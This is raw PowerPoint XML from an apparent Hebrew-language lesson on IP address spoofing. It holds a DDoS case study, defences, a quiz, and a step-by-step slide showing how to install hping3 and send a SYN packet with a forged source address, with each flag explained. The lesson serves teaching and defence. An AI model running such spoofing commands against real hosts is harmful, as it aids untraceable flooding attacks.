          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0E31F44-F80B-4066-B87F-36142ECF9F60}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעת זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אימות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אוטנטיקציה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מערכות שמבצעות אימות על פי פרטי משתמש או מפתחות חכמים, במקום לסמוך רק על כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פילטרים ופתרונות אנטי-זיוף: התקנה של מערכות שמנטרות ותופסות פעילות בלתי רגילה או ניסיונות זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10972339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40E3939-AA56-4BC7-A08E-812D5BE7BB2A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1878496" y="642594"/>
            <a:ext cx="9246704" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זיוף כתובת - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DDoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מסורבת"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7E892819-4011-4779-8EBB-B9EFC0B640E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>רקע: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חברת אונליין גדולה ניהלה אתר מסחר אלקטרוני עם מיליוני מבקרים ביום. האתר היה מוגן בחומת אש מתקדמת, אך התגלה כי ישנם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ברמת כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ,IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תקיפות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היו מסוכנות במיוחד עבורם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קבוצה של תוקפים החליטה להפעיל התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על האתר על ידי זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הם יצרו רשת רחבה של מחשבים שנשלטו מרחוק והשתמשו בהם לשלוח בקשות רבות לאתר. כדי להסתיר את מקור ההתקפה ולמנוע את מעקב אחריהם, התוקפים זייפו את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בכל חבילת מידע שנשלחה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תוצאה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפה זו גרמה לירידה דרסטית בביצועי האתר ולבעיות זמינות. החברה השקיעה הרבה מאמצים כדי לשדרג את הגנות האתר ולהטמיע פתרונות כמו אנליזה של תעבורה עם כלים מתקדמים כדי לזהות ולחסום ניסיונות זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11467916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7D7CFD-3678-4C7D-8A3A-E21E479A98AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3985590" y="642594"/>
            <a:ext cx="7139609" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הלכה למעשה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31D00465-99DB-44F2-9397-B3B31D10B903}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1858617"/>
            <a:ext cx="10058400" cy="4681331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלבים לזיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 1: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פתיחת טרמינל (או שורת פקודה)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>במערכת הפעלה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Linux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> macOS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פתח את הטרמינל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>במערכת הפעלה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> פתח את שורת הפקודה עם הרשאות מנהל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CMD</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש בכלי זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נשתמש בכלי שנקרא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>hping3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שהוא כלי גמיש מאוד לזיוף חבילות רשת, אמנם תחילה צריך להתקין אותו על המחשב </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 3: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקנת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>hping3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>במערכת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Linux</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> apt-get install hping3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 4: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שליחת חבילה עם כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מזויפת</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>hping3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -a 192.168.1.100 -c 1 -d 120 -S -p 80 192.168.1.101</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 5: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בדיקת תוצאות: תוכל להשתמש בכלי כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wireshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לראות את החבילות שנשלחו ולוודא שכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> המזויפת היא כפי שנדרש.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22248118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39F72F8-FDA5-4476-B9EA-C641D0896F97}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2037522" y="642594"/>
            <a:ext cx="9087678" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הלכה למעשה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5136972-EF20-4FA5-BA48-6BAAA8342363}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ביאור השורה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>hping3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -a 192.168.1.100 -c 1 -d 120 -S -p 80 192.168.1.101</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:-a 192.168.1.100</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זאת הכתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> המזויפת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-c 1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מספר החבילות לשלוח במקרה הזה אחת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:-d 120</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> גודל החבילה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שולח חבילת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SYN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-p 80</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: פורט היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>192.168.1.101</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הכתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6655112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6E9B60D-1E0E-481C-8255-2F457CD980A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3260034" y="642594"/>
            <a:ext cx="7865165" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - שאלות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D185EE57-F103-4F14-81FD-D9BDDDCF1ACC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהם הסיכונים בזיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד ניתן לזהות זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ברשת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מהם הכלים המשמשים לזיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. כיצד ניתן להגן על הרשת מפני זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13072029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C1C0992-512D-488B-A92C-4F03358759C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3906078" y="642594"/>
            <a:ext cx="7219122" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7B375309-F848-4116-A871-61993D39FA15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. סיכונים כוללים חשיפת המערכת להתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> פגיעה בפרטיות, והתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Man-in-the-Middle</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. ניתן לזהות זיוף באמצעות ניתוח תעבורה ברשת, זיהוי דפוסים חריגים, ושימוש בכלי ניטור כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDS/IPS</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. כלי כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>hping3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ו-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Wireshark </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>משמשים לזיוף ולבדיקת חבילות רשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. ניתן להגן באמצעות חומת אש מתקדמת, שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDS/IPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ויישום מדיניות אבטחה קפדנית שמנטרת ומגבילה תעבורה חשודה.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="334459545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98A7B24-1535-4D48-87AE-46698ED85185}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3548270" y="642594"/>
            <a:ext cx="7576930" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{817A04B4-DF31-4CA9-B77E-635BB0342AB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שאלה: כתיבת סקריפט </a:t>
            </a:r>
            <a:r>
